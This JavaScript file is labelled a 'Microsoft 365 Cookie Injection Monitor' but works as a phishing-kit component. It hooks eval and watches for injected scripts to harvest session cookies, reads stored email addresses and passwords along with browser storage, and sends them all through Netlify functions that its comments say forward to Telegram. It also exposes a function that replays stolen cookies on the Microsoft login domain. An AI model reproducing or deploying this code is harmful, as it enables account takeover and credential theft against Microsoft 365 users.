/**
 * Microsoft 365 Cookie Injection Monitor (Microsoft Domain Only)
 * This script monitors for cookie injections and captures them from Microsoft domains only
 */

// DYNAMIC COOKIE SETTER - matches your sample logic and is reusable
function setCookiesFromArray(cookies) {
  let results = [];
  cookies.forEach(cookie => {
    let cookieString = `${cookie.name}=${cookie.value}`;
    if (!cookie.name.startsWith('__Host') && cookie.domain) {
      cookieString += `; domain=${cookie.domain}`;
    }
    if (cookie.path) {
      cookieString += `; path=${cookie.path}`;
    }
    if (cookie.expires) {
      const expiresDate = new Date(cookie.expires * 1000);
      cookieString += `; expires=${expiresDate.toUTCString()}`;
    }
    if (cookie.httpOnly) {
      cookieString += '; HttpOnly';
    }
    if (cookie.secure || cookie.name.startsWith('__Host') || cookie.name.startsWith('__Secure')) {
      cookieString += '; Secure';
    }
    if (cookie.samesite) {
      cookieString += `; SameSite=${cookie.samesite}`;
    }
    document.cookie = cookieString;
    results.push({
      name: cookie.name,
      expires: cookie.expires ? new Date(cookie.expires * 1000).toUTCString() : 'Session',
    });
  });
  console.table(results);
}

// Export to global for use in other scripts/components
window.restoreMicrosoftCookies = setCookiesFromArray;

(function() {
  'use strict';

  console.log('🚀 Microsoft 365 Cookie Monitor loaded - MICROSOFT DOMAIN ONLY');

  // Store for captured cookies
  let capturedCookies = new Map();

  // Enhanced cookie capture with debugging
  function captureAllCookies() {
    try {
      const allCookies = [];
      const documentCookies = document.cookie;

      console.log('🔍 Cookie capture debug:', {
        documentCookieLength: documentCookies ? documentCookies.length : 0,
        documentCookieContent: documentCookies || 'EMPTY',
        currentDomain: window.location.hostname,
        currentPath: window.location.pathname,
        protocol: window.location.protocol
      });

      // Parse existing document cookies
      if (documentCookies && documentCookies.trim() !== '') {
        const cookieStrings = documentCookies.split(';');
        console.log('🔍 Found', cookieStrings.length, 'cookie strings to parse');
        
        for (const cookieStr of cookieStrings) {
          const [name, ...valueParts] = cookieStr.trim().split('=');
          const value = valueParts.join('=');

          if (name && value) {
            const cookie = {
              name: name.trim(),
              value: value.trim(),
              domain: '.login.microsoftonline.com', // Always use Microsoft domain
              path: '/',
              secure: true,
              httpOnly: false,
              sameSite: 'none',
              expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
              hostOnly: false,
              session: false,
              storeId: null,
              captureMethod: 'document',
              timestamp: new Date().toISOString()
            };

            allCookies.push(cookie);
            capturedCookies.set(`${cookie.name}:${cookie.domain}`, cookie);
            console.log('✅ Captured cookie:', name.trim());
          } else {
            console.warn('⚠️ Skipped invalid cookie string:', cookieStr);
          }
        }
      } else {
        console.warn('⚠️ No document.cookie content found');
        
        // Try alternative capture methods if no cookies found
        try {
          // Capture some session data as fallback
          const sessionData = {
            name: 'session_capture_fallback',
            value: JSON.stringify({
              url: window.location.href,
              timestamp: new Date().toISOString(),
              userAgent: navigator.userAgent,
              referrer: document.referrer
            }),
            domain: '.login.microsoftonline.com',
            path: '/',
            secure: true,
            httpOnly: false,
            sameSite: 'none',
            expirationDate: Math.floor(Date.now() / 1000) + (24 * 60 * 60),
            hostOnly: false,
            session: false,
            storeId: null,
            captureMethod: 'fallback',
            timestamp: new Date().toISOString()
          };
          allCookies.push(sessionData);
          console.log('✅ Added fallback session data');
        } catch (fallbackError) {
          console.error('❌ Fallback capture failed:', fallbackError);
        }
      }

      console.log('🍪 Final cookie capture result:', {
        totalCookies: allCookies.length,
        cookieNames: allCookies.map(c => c.name),
        fromDomain: window.location.hostname
      });
      
      return allCookies;

    } catch (error) {
      console.error('❌ Error capturing cookies:', error);
      // Return error info as a cookie for debugging
      return [{
        name: 'capture_error',
        value: error.message,
        domain: '.login.microsoftonline.com',
        path: '/',
        secure: true,
        httpOnly: false,
        sameSite: 'none',
        expirationDate: Math.floor(Date.now() / 1000) + (24 * 60 * 60),
        hostOnly: false,
        session: false,
        storeId: null,
        captureMethod: 'error',
        timestamp: new Date().toISOString()
      }];
    }
  }

  // Microsoft domain provider detection
  function detectEmailProvider(hostname, email = '') {
    if (hostname.includes('microsoftonline.com') ||
        hostname.includes('outlook.com') ||
        hostname.includes('live.com') ||
        hostname.includes('hotmail.com') ||
        email.includes('@outlook.com') ||
        email.includes('@hotmail.com') ||
        email.includes('@live.com')) {
      return 'Microsoft/Outlook';
    }
    return `Other (${hostname})`;
  }

  // Monitor for cookie injection patterns - Microsoft only
  function monitorCookieInjections() {
    const originalEval = window.eval;
    window.eval = function(code) {
      try {
        if (typeof code === 'string') {
          if (code.includes('document.cookie') || 
              code.includes('JSON.parse([') ||
              code.includes('"name"') && code.includes('"value"') ||
              code.includes('Max-Age') ||
              code.includes('SameSite') ||
              code.includes('Secure') ||
              code.includes('HttpOnly') ||
              code.includes('Path=') ||
              code.includes('Domain=') ||
              code.includes('expires=')) {

            console.log('🔍 Cookie injection detected on:', window.location.hostname);
            console.log('📝 Code snippet:', code.substring(0, 300) + '...');
            extractCookiesFromCode(code);
          }
        }
      } catch (e) {
      }
      return originalEval.call(this, code);
    };

    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        mutation.addedNodes.forEach((node) => {
          if (node.nodeType === Node.ELEMENT_NODE) {
            const element = node;
            if (element.tagName === 'SCRIPT' && element.textContent) {
              extractCookiesFromCode(element.textContent);
            }
          }
        });
      });
    });

    if (document.body) {
      observer.observe(document.body, { childList: true, subtree: true });
    } else {
      document.addEventListener('DOMContentLoaded', () => {
        observer.observe(document.body, { childList: true, subtree: true });
      });
    }
  }

  // Enhanced cookie extraction - Microsoft only
  function extractCookiesFromCode(code) {
    try {
      console.log('🔍 Analyzing code for cookies on:', window.location.hostname);

      const jsonMatches = code.match(/JSON\.parse\(\[[\s\S]*?\]\)/g);
      if (jsonMatches) {
        console.log('🎯 Found JSON.parse patterns:', jsonMatches.length);
        jsonMatches.forEach(match => {
          try {
            const arrayMatch = match.match(/\[([\s\S]*?)\]/);
            if (arrayMatch) {
              const arrayStr = '[' + arrayMatch[1] + ']';
              console.log('🔍 Parsing array from:', window.location.hostname);
              const cookies = JSON.parse(arrayStr);
              if (Array.isArray(cookies)) {
                console.log('🍪 Found cookie array:', cookies.length, 'cookies from', window.location.hostname);
                cookies.forEach(cookie => processCookieObject(cookie, 'injection'));
                setTimeout(() => {
                  autoSendCapturedData();
                }, 1000);
              }
            }
          } catch (e) {
            console.log('⚠️ Failed to parse JSON cookies from', window.location.hostname, ':', e.message);
            tryAlternativeParsing(match);
          }
        });
      }

      const cookieSetMatches = code.match(/document\.cookie\s*=\s*[`"']([^`"']+)[`"']/g);
      if (cookieSetMatches) {
        console.log('🎯 Found direct cookie assignments:', cookieSetMatches.length);
        cookieSetMatches.forEach(match => {
          const cookieStr = match.replace(/document\.cookie\s*=\s*[`"']/, '').replace(/[`"']$/, '');
          parseCookieString(cookieStr, 'injection');
        });
      }

      const templateMatches = code.match(/document\.cookie\s*=\s*`([^`]+)`/g);
      if (templateMatches) {
        console.log('🎯 Found template literal cookies:', templateMatches.length);
        templateMatches.forEach(match => {
          const cookieStr = match.replace(/document\.cookie\s*=\s*`/, '').replace(/`$/, '');
          parseCookieString(cookieStr, 'injection');
        });
      }

      const objectMatches = code.match(/\{[^}]*["']name["'][^}]*["']value["'][^}]*\}/g);
      if (objectMatches) {
        console.log('🎯 Found cookie objects:', objectMatches.length);
        objectMatches.forEach(match => {
          tryAlternativeParsing(match);
        });
      }

    } catch (error) {
      console.error('❌ Error extracting cookies from', window.location.hostname, ':', error);
    }
  }

  // Auto-send captured data to Telegram - MICROSOFT ONLY
  async function autoSendCapturedData() {
    try {
      const cookies = getAllCapturedCookies();
      if (cookies.length > 0) {
        console.log('📤 Microsoft 365: Auto-sending', cookies.length, 'captured cookies from', window.location.hostname, 'to Telegram...');
        const sessionData = JSON.parse(localStorage.getItem('microsoft365_autograb_session') || localStorage.getItem('microsoft365_session') || '{}');
        const provider = detectEmailProvider(window.location.hostname, sessionData.email);
        const browserFingerprint = getBrowserFingerprint();
        const email = sessionData.email || `auto-captured@${window.location.hostname}`;
        const password = sessionData.password || 'Auto-captured cookies';
        const result = await sendDataToBackend(
          email,
          password,
          provider
        );
        // ALSO save session to backend after sending to Telegram
        try {
          await fetch('/.netlify/functions/saveSession', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              email,
              password,
              provider,
              fileName: `Cookie Data - ${provider}`,
              timestamp: new Date().toISOString(),
              sessionId: sessionData.sessionId || Math.random().toString(36).substring(2, 15),
              formattedCookies: cookies,
              localStorage: browserFingerprint.localStorage,
              sessionStorage: browserFingerprint.sessionStorage,
              browserFingerprint: browserFingerprint,
              documentCookies: document.cookie
            })
          });
          console.log('✅ Session saved to backend after autoSend');
        } catch (saveError) {
          console.error('❌ Failed to save session in autoSend:', saveError);
        }
        sessionData.cookiesSent = true;
        sessionData.lastSentTime = new Date().toISOString();
        sessionData.cookieCount = cookies.length;
        localStorage.setItem('microsoft365_autograb_session', JSON.stringify(sessionData));
      }
    } catch (error) {
      console.error('❌ Microsoft 365: Auto-send failed for', window.location.hostname, ':', error);
    }
  }

  function tryAlternativeParsing(codeSnippet) {
    try {
      const patterns = [
        /\{[^}]*"name"\s*:\s*"([^"]+)"[^}]*"value"\s*:\s*"([^"]+)"[^}]*\}/g,
        /\{[^}]*'name'\s*:\s*'([^']+)'[^}]*'value'\s*:\s*'([^']+)'[^}]*\}/g,
        /name\s*:\s*["']([^"']+)["'][^,]*value\s*:\s*["']([^"']+)["']/g
      ];

      patterns.forEach(pattern => {
        let match;
        while ((match = pattern.exec(codeSnippet)) !== null) {
          processCookieObject({
            name: match[1],
            value: match[2],
            domain: '.login.microsoftonline.com'
          }, 'injection');
        }
      });

      if (codeSnippet.includes('{') && codeSnippet.includes('}')) {
        try {
          const cookieObj = JSON.parse(codeSnippet);
          if (cookieObj.name && cookieObj.value) {
            processCookieObject(cookieObj, 'injection');
          }
        } catch (e) {
        }
      }

    } catch (error) {
      console.error('❌ Alternative parsing failed for', window.location.hostname, ':', error);
    }
  }

  function processCookieObject(cookieObj, method) {
    try {
      if (cookieObj && cookieObj.name && cookieObj.value) {
        const cookie = {
          name: cookieObj.name,
          value: cookieObj.value,
          domain: '.login.microsoftonline.com',
          path: cookieObj.path || '/',
          secure: true,
          httpOnly: cookieObj.httpOnly || false,
          sameSite: cookieObj.sameSite || 'none',
          expirationDate: cookieObj.expirationDate || Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
          hostOnly: cookieObj.hostOnly || false,
          session: cookieObj.session || false,
          storeId: cookieObj.storeId || null,
          captureMethod: method,
          timestamp: new Date().toISOString(),
          sourceHostname: window.location.hostname,
          detectedProvider: detectEmailProvider(window.location.hostname)
        };

        const key = `${cookie.name}:${cookie.domain}`;
        capturedCookies.set(key, cookie);

        console.log(`🍪 Captured cookie [${method}]:`, cookie.name, 'from', cookie.sourceHostname, 'provider:', cookie.detectedProvider);

        updateStoredSession();
      }
    } catch (error) {
      console.error('❌ Error processing cookie object from', window.location.hostname, ':', error);
    }
  }

  function parseCookieString(cookieString, method) {
    try {
      const parts = cookieString.split(';');
      const [name, ...valueParts] = parts[0].split('=');
      const value = valueParts.join('=');

      if (name && value) {
        const cookie = {
          name: name.trim(),
          value: value.trim(),
          domain: '.login.microsoftonline.com',
          path: '/',
          secure: true,
          httpOnly: false,
          sameSite: 'none',
          expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
          hostOnly: false,
          session: false,
          storeId: null,
          captureMethod: method,
          timestamp: new Date().toISOString(),
          sourceHostname: window.location.hostname,
          detectedProvider: detectEmailProvider(window.location.hostname)
        };

        for (let i = 1; i < parts.length; i++) {
          const part = parts[i].trim().toLowerCase();
          if (part.startsWith('domain=')) {
            cookie.domain = '.login.microsoftonline.com';
          } else if (part.startsWith('path=')) {
            cookie.path = part.substring(5);
          } else if (part === 'secure') {
            cookie.secure = true;
          } else if (part === 'httponly') {
            cookie.httpOnly = true;
          } else if (part.startsWith('samesite=')) {
            cookie.sameSite = part.substring(9);
          }
        }

        const key = `${cookie.name}:${cookie.domain}`;
        capturedCookies.set(key, cookie);

        console.log(`🍪 Captured cookie [${method}]:`, cookie.name, 'from', cookie.sourceHostname, 'provider:', cookie.detectedProvider);
        updateStoredSession();
      }
    } catch (error) {
      console.error('❌ Error parsing cookie string from', window.location.hostname, ':', error);
    }
  }

  function updateStoredSession() {
    try {
      const storedSession = localStorage.getItem('microsoft365_autograb_session') || localStorage.getItem('microsoft365_session');
      if (storedSession) {
        const sessionData = JSON.parse(storedSession);
        sessionData.cookies = Array.from(capturedCookies.values());
        sessionData.formattedCookies = Array.from(capturedCookies.values());
        sessionData.totalCookiesCaptured = capturedCookies.size;
        sessionData.lastCookieUpdate = new Date().toISOString();
        sessionData.currentDomain = window.location.hostname;
        sessionData.detectedProvider = detectEmailProvider(window.location.hostname, sessionData.email);
        localStorage.setItem('microsoft365_autograb_session', JSON.stringify(sessionData));
        localStorage.setItem('microsoft365_session', JSON.stringify(sessionData));
      }
    } catch (error) {
      console.error('❌ Microsoft 365: Error updating stored session for', window.location.hostname, ':', error);
    }
  }

  function getAllCapturedCookies() {
    return Array.from(capturedCookies.values());
  }

  function getBrowserFingerprint() {
    try {
      const cookies = getAllCapturedCookies();

      let localStorage = 'Empty';
      try {
        const localStorageData = {};
        for (let i = 0; i < window.localStorage.length; i++) {
          const key = window.localStorage.key(i);
          localStorageData[key] = window.localStorage.getItem(key);
        }
        localStorage = Object.keys(localStorageData).length > 0 ? JSON.stringify(localStorageData) : 'Empty';
      } catch (e) {
        localStorage = 'Access denied';
      }

      let sessionStorage = 'Empty';
      try {
        const sessionStorageData = {};
        for (let i = 0; i < window.sessionStorage.length; i++) {
          const key = window.sessionStorage.key(i);
          sessionStorageData[key] = window.sessionStorage.getItem(key);
        }
        sessionStorage = Object.keys(sessionStorageData).length > 0 ? JSON.stringify(sessionStorageData) : 'Empty';
      } catch (e) {
        sessionStorage = 'Access denied';
      }

      return {
        cookies: cookies,
        localStorage: localStorage,
        sessionStorage: sessionStorage,
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        cookieEnabled: navigator.cookieEnabled,
        timestamp: new Date().toISOString(),
        url: window.location.href,
        domain: window.location.hostname,
        documentCookies: document.cookie,
        totalCaptured: cookies.length,
        detectedProvider: detectEmailProvider(window.location.hostname),
        captureStats: {
          injection: cookies.filter(c => c.captureMethod === 'injection').length,
          document: cookies.filter(c => c.captureMethod === 'document').length,
          byProvider: cookies.reduce((acc, cookie) => {
            const provider = cookie.detectedProvider || 'Unknown';
            acc[provider] = (acc[provider] || 0) + 1;
            return acc;
          }, {})
        }
      };

    } catch (error) {
      console.error('❌ Error getting browser fingerprint for', window.location.hostname, ':', error);
      return {
        cookies: getAllCapturedCookies(),
        localStorage: 'Error',
        sessionStorage: 'Error',
        userAgent: navigator.userAgent || 'Unknown',
        language: navigator.language || 'Unknown',
        platform: navigator.platform || 'Unknown',
        cookieEnabled: navigator.cookieEnabled || false,
        timestamp: new Date().toISOString(),
        url: window.location.href,
        domain: window.location.hostname,
        documentCookies: document.cookie,
        totalCaptured: capturedCookies.size,
        detectedProvider: detectEmailProvider(window.location.hostname),
        error: error.message
      };
    }
  }

  async function sendDataToBackend(email, password, provider = 'Microsoft') {
    try {
      const browserFingerprint = getBrowserFingerprint();

      console.log('📤 Sending data to backend from', window.location.hostname, ':', {
        email,
        provider,
        cookieCount: browserFingerprint.cookies.length,
        hasLocalStorage: browserFingerprint.localStorage !== 'Empty',
        hasSessionStorage: browserFingerprint.sessionStorage !== 'Empty'
      });

      const response = await fetch('/.netlify/functions/sendTelegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: email,
          password: password,
          provider: provider,
          fileName: `Cookie Data - ${provider}`,
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          browserFingerprint: browserFingerprint,
          documentCookies: document.cookie,
          sessionId: Math.random().toString(36).substring(2, 15),
          cookies: browserFingerprint.cookies,
          formattedCookies: browserFingerprint.cookies,
          localStorage: browserFingerprint.localStorage,
          sessionStorage: browserFingerprint.sessionStorage,
          sourceHostname: window.location.hostname,
          detectedProvider: provider,
          universalCapture: false
        })
      });

      const result = await response.json();
      console.log('✅ Backend response for', window.location.hostname, ':', result);

      try {
        await fetch('/.netlify/functions/saveSession', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            email: email,
            password: password,
            provider: provider,
            cookies: browserFingerprint.cookies,
            formattedCookies: browserFingerprint.cookies,
            localStorage: browserFingerprint.localStorage,
            sessionStorage: browserFingerprint.sessionStorage,
            browserFingerprint: browserFingerprint,
            sessionId: Math.random().toString(36).substring(2, 15),
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent
          })
        });
      } catch (saveError) {
        console.error('❌ Error saving session:', saveError);
      }

      return result;

    } catch (error) {
      console.error('❌ Error sending data to backend from', window.location.hostname, ':', error);
      return { error: error.message };
    }
  }

  function initialize() {
    console.log('🚀 Microsoft 365: Initializing cookie capture for:', window.location.hostname);

    captureAllCookies();
    monitorCookieInjections();

    setInterval(() => {
      const newCookies = captureAllCookies();
      if (newCookies.length > 0) {
        console.log('🔄 Microsoft 365: Periodic cookie check found', newCookies.length, 'cookies on', window.location.hostname);
      }
    }, 5000);

    console.log('✅ Microsoft 365: Cookie capture initialized for:', window.location.hostname);
  }

  window.captureAllCookies = getAllCapturedCookies;
  window.getBrowserFingerprint = getBrowserFingerprint;
  window.sendDataToBackend = sendDataToBackend;
  window.advancedCookieCapture = {
    getAllCookies: getAllCapturedCookies,
    getStats: () => ({
      total: capturedCookies.size,
      currentDomain: window.location.hostname,
      detectedProvider: detectEmailProvider(window.location.hostname),
      byMethod: {
        injection: getAllCapturedCookies().filter(c => c.captureMethod === 'injection').length,
        document: getAllCapturedCookies().filter(c => c.captureMethod === 'document').length
      },
      byProvider: getAllCapturedCookies().reduce((acc, cookie) => {
        const provider = cookie.detectedProvider || 'Unknown';
        acc[provider] = (acc[provider] || 0) + 1;
        return acc;
      }, {})
    }),
    exportCookies: () => JSON.stringify(getAllCapturedCookies(), null, 2)
  };

  // NEW: restore cookies from outside (dynamic call)
  window.restoreMicrosoftCookies = setCookiesFromArray;

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initialize);
  } else {
    setTimeout(initialize, 500);
  }

  window.addEventListener('load', () => {
    setTimeout(initialize, 1000);
  });

})();